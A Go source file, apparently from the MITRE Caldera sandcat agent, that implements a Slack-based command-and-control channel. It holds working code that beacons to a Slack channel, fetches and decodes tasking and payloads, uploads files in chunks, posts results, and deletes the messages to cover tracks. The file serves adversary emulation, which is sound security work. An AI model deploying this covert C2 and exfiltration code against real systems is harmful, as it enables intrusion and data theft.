package contact

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"math/rand"
	"strconv"
	"time"
	"net/http"
	"bytes"
	"io/ioutil"
	"strings"

	"github.com/mitre/gocat/output"

)

const (
	slackTimeout = 60
	slackTimeoutResetInterval = 5
	slackError = 500
	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon slack response before giving up.
	beaconWait = 10 // number of seconds to wait for beacon slack response in case of initial failure.
	maxDataChunkSize = 750000 // Github SLACK has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
	// todo: fix above line later
)

var (
	token = ""
	channel_id = "{SLACK_C2_CHANNEL_ID}"
	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	username string
)

type SLACK struct {
	name string
}

func init() {
	CommunicationChannels["SLACK"] = SLACK{ name: "SLACK" }
}

//GetInstructions sends a beacon and returns instructions
func (g SLACK) GetBeaconBytes(profile map[string]interface{}) []byte {
	checkValidSleepInterval(profile)
	var retBytes []byte
	bites, heartbeat := slackBeacon(profile)
	if heartbeat == true {
		retBytes = bites
	}
	return retBytes
}

//GetPayloadBytes load payload bytes from github
func (g SLACK) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
	var payloadBytes []byte
	var err error
	output.VerbosePrint("[+] Attempting to retrieve payload...")
	if _, ok := profile["paw"]; !ok {
		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
		return nil, ""
	}
	payloads := getSlacks("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
	if payloads[0] != "" {
		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode payload bytes: %s", err.Error()))
			return nil, ""
		}
	}
	return payloadBytes, payloadName
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (g SLACK) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
    config := make(map[string]string)
    if len(criteria["c2Key"]) > 0 {
        token = criteria["c2Key"]
        if len(profile["paw"].(string)) == 0 {
        	config["paw"] = getBeaconNameIdentifier()
        }
        return true, config
    }
    return false, nil
}

//SendExecutionResults send results to the server
func (g SLACK) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results
	slackResults(profileCopy)
}

func (g SLACK) GetName() string {
	return g.name
}

func (g SLACK) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
	encodedFilename := base64.StdEncoding.EncodeToString([]byte(uploadName))
	paw := profile["paw"].(string)

	// Upload file in chunks
	uploadId := getNewUploadId()
	dataSize := len(data)
	numChunks := int(math.Ceil(float64(dataSize) / float64(maxDataChunkSize)))
	start := 0
	slackName := getSlackNameForUpload(paw)
	for i := 0; i < numChunks; i++ {
		end := start + maxDataChunkSize
		if end > dataSize {
			end = dataSize
		}
		chunk := data[start:end]
		slackDescription := getSlackDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
		if err := uploadFileChunk(slackName, slackDescription, chunk); err != nil {
			return err
		}
		start += maxDataChunkSize
	}
	return nil
}

func getSlackNameForUpload(paw string) string {
	return getSlackDescriptor("upload", paw)
}

func getSlackDescriptionForUpload(uploadId string, encodedFilename string, chunkNum int, totalChunks int) string {
	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
}

func uploadFileChunk(slackName string, slackDescription string, data []byte) error {
	if result := createSlack(slackName, slackDescription, data); result != true {
		return errors.New(fmt.Sprintf("Failed to create file upload SLACK. Response code: %s", result))
	}
	return nil
}

func slackBeacon(profile map[string]interface{}) ([]byte, bool) {
	failCount := 0
	heartbeat := createHeartbeatSlack("beacon", profile)
	if heartbeat {
		//collect instructions & delete
		for failCount < beaconResponseFailThreshold {
			contents := getSlackMessages("instructions", profile["paw"].(string));
			if contents != nil {
				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
				if err != nil {
					output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
					return nil, heartbeat
				}
				return decodedContents, heartbeat
			}
			// Wait for C2 server to provide instruction response slack.
			time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
			failCount += 1
		}
		output.VerbosePrint("[!] Failed to fetch beacon response from C2.")
	}
	return nil, heartbeat
}

func createHeartbeatSlack(slackType string, profile map[string]interface{}) bool {
	data, err := json.Marshal(profile)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack heartbeat. Error with profile marshal: %s", err.Error()))
		output.VerbosePrint("[-] Heartbeat SLACK: FAILED")
		return false
	} else {
		paw := profile["paw"].(string)
		slackName := getSlackDescriptor(slackType, paw)
		slackDescription := slackName
		if createSlack(slackName, slackDescription, data) != true {
			output.VerbosePrint("[-] Heartbeat SLACK: FAILED")
			return false
		}
	}
	output.VerbosePrint("[+] Heartbeat SLACK: SUCCESS")
	return true
}

func slackResults(result map[string]interface{}) {
	data, err := json.Marshal(result)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack results. Error with result marshal: %s", err.Error()))
		output.VerbosePrint("[-] Results SLACK: FAILED")
	} else {
		paw := result["paw"].(string)
		slackName := getSlackDescriptor("results", paw)
		slackDescription := slackName
		if createSlack(slackName, slackDescription, data) != true {
			output.VerbosePrint("[-] Results SLACK: FAILED")
		} else {
			output.VerbosePrint("[+] Results SLACK: SUCCESS")
		}
	}
}



func createSlack(slackName string, description string, data []byte) bool {
	// returns false if it failed, true if success
	stringified := base64.StdEncoding.EncodeToString(data)
	slackText := fmt.Sprintf("%s | %s", slackName, stringified);
	requestBody, err := json.Marshal(map[string]string{
		"channel": channel_id,
		"text": slackText,
	})
	
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
		return false
	}
	
	var result map[string]interface{}
	json.Unmarshal(post_request("https://slack.com/api/chat.postMessage", requestBody), &result);

	return result["ok"].(bool);
}

func getSlackMessages(slackType string, uniqueID string) []string {
	var contents []string
	var popog []byte

	var result map[string]interface{}
	popog = get_request(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channel_id, time.Now().Unix()-slackTimeout*2))
	json.Unmarshal(popog, &result);

	if result["ok"] == false {
		// error stuff
		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", popog))
		return contents
	}

	for i := range result["messages"].([]interface{}) {
		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
			// we only want the text here

			contents = append(contents, strings.SplitN(fmt.Sprintf("%s", text), " | ", 2)[1])
			
			// now delete it
			//s = requests.post('https://slack.com/api/chat.delete',headers={"Authorization":"Bearer %s"%(APIKEY), "charset":"utf-8"}, data={"channel":"C022KUS0E5R","ts":ts})
			requestBody, err := json.Marshal(map[string]interface{}{
				"channel":channel_id,
				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
			})
			
			if err != nil {
				output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
			}

			//var result2 map[string]interface{}
			if (!strings.Contains(slackType,"payloads")) {
				post_request("https://slack.com/api/chat.delete", requestBody);
			}
			


		}
	}



	return contents
}

func getSlacks(slackType string, uniqueID string) []string {
	var contents []string
	var url_file string
	var popog []byte

	var result map[string]interface{}
	popog = get_request(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channel_id, time.Now().Unix()-slackTimeout*2))
	json.Unmarshal(popog, &result);

	if result["ok"] == false {
		// error stuff
		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", popog))
		return contents
	}

	for i := range result["messages"].([]interface{}) {
		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
			// use preview for now
			// TODO: if larger file, actually retrieve the file download
			
			// contents = append(contents, result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["preview"].(string))
			url_file = result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["url_private_download"].(string)
			contents = append(contents, fmt.Sprintf("%s", get_request(url_file)))
			
			// now delete it
			//s = requests.post('https://slack.com/api/chat.delete',headers={"Authorization":"Bearer %s"%(APIKEY), "charset":"utf-8"}, data={"channel":"C022KUS0E5R","ts":ts})
			requestBody, err := json.Marshal(map[string]interface{}{
				"channel":channel_id,
				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
			})
			
			if err != nil {
				output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
			}

			//var result2 map[string]interface{}
			if (!strings.Contains(slackType,"payloads")) {
				post_request("https://slack.com/api/chat.delete", requestBody);
			}
			


		}
	}



	return contents
}


func getSlackDescriptor(slackType string, uniqueId string) string {
	return fmt.Sprintf("%s-%s", slackType, uniqueId)
}

func checkValidSleepInterval(profile map[string]interface{}) {
	if profile["sleep"] == slackTimeout{
		time.Sleep(time.Duration(float64(slackTimeoutResetInterval)) * time.Second)
	}
}

func getBeaconNameIdentifier() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Int())
}

func getNewUploadId() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Int())
}

func post_request(address string, data []byte) []byte {
	// data should already be encoded
	//encodedData := []byte(base64.StdEncoding.EncodeToString(data))
	req, err := http.NewRequest("POST", address, bytes.NewBuffer(data))
	req.Header.Set("Authorization", "Bearer " + token)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("charset", "utf-8")
	
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
		return nil
	}
	timeout := time.Duration(slackTimeout * time.Second)
	client := http.Client{
		Timeout: timeout,
	}
	resp, err := client.Do(req)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to perform HTTP request: %s", err.Error()))
		return nil
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to read HTTP response: %s", err.Error()))
		return nil
	}
	return body
}

func get_request(address string) []byte {
	req, err := http.NewRequest("GET", address, nil)
	req.Header.Set("Authorization", "Bearer " + token)
	
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
		return nil
	}
	timeout := time.Duration(slackTimeout * time.Second)
	client := http.Client{
		Timeout: timeout,
	}
	resp, err := client.Do(req)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to perform HTTP request: %s", err.Error()))
		return nil
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to read HTTP response: %s", err.Error()))
		return nil
	}
	return body
}